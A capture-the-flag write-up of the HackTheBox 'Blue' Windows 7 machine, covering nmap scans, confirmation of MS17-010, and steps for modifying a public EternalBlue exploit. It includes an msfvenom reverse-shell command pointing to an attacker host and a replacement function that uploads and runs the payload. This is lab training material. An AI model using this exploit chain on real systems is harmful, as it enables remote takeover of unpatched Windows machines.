---
description: Blue box from HackTheBox write up.
---

# Blue

## Nmap

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 1000 <MACHINE_IP> 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 14:54 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.048s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 35.47 seconds
           Raw packets sent: 65843 (2.897MB) | Rcvd: 65673 (2.627MB)
```

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Blue]
└─$ sudo nmap -sC -sV -p135,139,445,49152,49153,49154,49155,49156,49157 <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 16:06 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.048s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m51s, deviation: 34m36s, median: 6s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-26T21:07:40+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-26T20:07:39
|_  start_date: 2021-09-26T18:54:31

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.74 seconds
```

The most interesting thing is SMB. Let's dig a bit.

## Eternal Blue?

Since the SMB service is running in a Windows 7 machine I wanted to check if could be vulnerable to Eternal Blue:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Blue]
└─$ sudo nmap --script smb-vuln* -p445 <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 17:22 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.048s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds

```

It is cool! Now we can go for the easy path using the Metasploit exploit: `windows/smb/ms17_010_eternalblue` or try to own the machine searching for the exploit ourselves, I guess you know my preference.

## Getting access

First, we need an exploit for this so using `searchsploit` we can get what we need:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Blue/exploit]
└─$ searchsploit ms17-010                                                                   
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                       |  Path
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17 | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                        | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                     | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                 | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                           | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                        | windows_x86-64/remote/41987.py
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

I would go with the `windows/remote/42315.py` one so executing: `searchsploit -m windows/remote/42315.py` we will copy the exploit to our current directory. Now it is time to configure the exploit:

1. Get `mysmb.py` from the exploit link.
2. In the line 36 configure the username as `guest` (Using `smbclient` you can check that anonymous login is allowed for the $IPC share).
3. Generate a Windows reverse shell: `msfvenom -p windows/shell_reverse_tcp LHOST=<ATACKER_IP> LPORT=8080 -f exe > revshell.exe`
4. Go the line 913 and replace the `smb_pwn` function with this:
```python
def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()

    print('exec revshell')

    smb_send_file(smbConn, './revshell.exe', 'C', '/revshell.exe')
    service_exec(conn, r'cmd /c , c:\revshell.exe')
```
5. Spin up a listener in the 8080 port (Or whaterver port you configure the reverse shell with)
6. Run the exploit with `python 42315.py <MACHINE_IP>` to get a shell!

Since Eternal Blue give access as `system` we have finished and can get the flags:

```
C:\Users\haris\Desktop\user.txt
C:\Users\Administrator\Desktop\root.txt
```
